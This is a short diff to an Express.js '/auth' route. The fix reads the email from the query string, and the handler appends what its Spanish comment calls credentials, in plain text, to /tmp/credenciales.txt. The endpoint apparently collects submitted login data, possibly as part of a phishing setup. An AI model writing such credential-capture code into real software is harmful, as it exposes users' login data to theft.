@@ -16,10 +16,11 @@ app.use(
 );
 
 app.get("/auth", (req, res) => {
-  const { email } = req.params.email || "";
+  const email = req.query.email || "";
 
- // Guardar credenciales en archivo
+  // Guardar credenciales en archivo
   const credenciales = `Email: ${email} | Mail \n`;
+
   const tempPath = path.join("/tmp", "credenciales.txt");
   fs.appendFileSync(tempPath, credenciales);
 
